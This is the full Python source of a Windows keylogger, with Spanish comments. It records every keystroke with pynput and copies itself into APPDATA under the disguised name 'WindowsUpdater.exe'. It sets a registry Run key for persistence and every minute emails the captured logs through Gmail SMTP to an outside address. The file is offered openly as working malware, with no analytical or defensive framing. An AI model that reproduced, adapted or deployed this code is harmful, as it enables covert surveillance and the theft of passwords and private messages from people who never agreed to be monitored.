from pynput import keyboard 
import smtplib
from email.mime.text import MIMEText
from threading import Timer
import os
import shutil
import sys
import subprocess
import winreg as reg

# Configuracion de correo
EMAIL = "email"
PASSWORD = "passw"
DESTINO = "destino@gmail.com"
ENVIO_INTERVALO = 60  # Enviar cada 60 segundos
LOG_FILE = os.path.join(os.getenv("TEMP"), "log.txt")  # Carpeta temporal para guardar los logs

key_log = []  # Lista para almacenar las teclas capturadas

# Mover el archivo ejecutable a una ubicación oculta y configurar inicio automático
def mover_y_ocultar():
    destino = os.path.join(os.getenv("APPDATA"), "WindowsUpdater.exe")  # Ruta destino

    # Si no está en la ubicación destino, moverlo
    if not os.path.exists(destino):
        try:
            shutil.copy(sys.executable, destino)  # Mover el archivo actual
            agregar_inicio(destino)  # Configurar inicio automático

            # Ejecutar desde la nueva ubicación
            subprocess.Popen(destino, shell=True)
            sys.exit()  # Salir de la ejecución inicial
        except Exception as e:
            print(f"[ERROR] No se pudo mover el archivo: {e}")

# Configurar el inicio automático en el registro
def agregar_inicio(ruta):
    try:
        clave = r"Software\Microsoft\Windows\CurrentVersion\Run"
        nombre = "WindowsUpdater"
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, clave, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, nombre, 0, reg.REG_SZ, ruta)
        reg.CloseKey(reg_key)
    except Exception as e:
        print(f"[ERROR] No se pudo agregar al inicio: {e}")

# Enviar logs por correo
def enviar_correo():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as file:
                contenido = file.read()

            if contenido:  # Solo enviar si hay contenido
                msg = MIMEText(contenido)
                msg["Subject"] = "Keylogger Logs"
                msg["From"] = EMAIL
                msg["To"] = DESTINO

                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(EMAIL, PASSWORD)
                    server.sendmail(EMAIL, DESTINO, msg.as_string())

                print("[INFO] Logs enviados por correo.")

            # Limpiar los logs después de enviarlos
            with open(LOG_FILE, "w") as file:
                file.write("")
    except Exception as e:
        print(f"[ERROR] No se pudo enviar el correo: {e}")

    # Programar el siguiente envío
    Timer(ENVIO_INTERVALO, enviar_correo).start()

# Capturar teclas
def on_press(key):
    try:
        key_log.append(key.char)
    except AttributeError:
        key_log.append(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:  # Salir al presionar Esc
        return False

# Guardar logs en un archivo
def guardar_logs():
    try:
        with open(LOG_FILE, "a") as file:
            file.write("".join(key_log))
        key_log.clear()
    except Exception as e:
        print(f"[ERROR] No se pudo guardar el log: {e}")

# Programar guardado periódico de logs
def tareas_periodicas():
    guardar_logs()
    Timer(ENVIO_INTERVALO, tareas_periodicas).start()

# Iniciar el keylogger
def iniciar_keylogger():
    tareas_periodicas()
    enviar_correo()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    mover_y_ocultar()  # Ocultar y configurar persistencia
    iniciar_keylogger()  # Iniciar captura de teclas
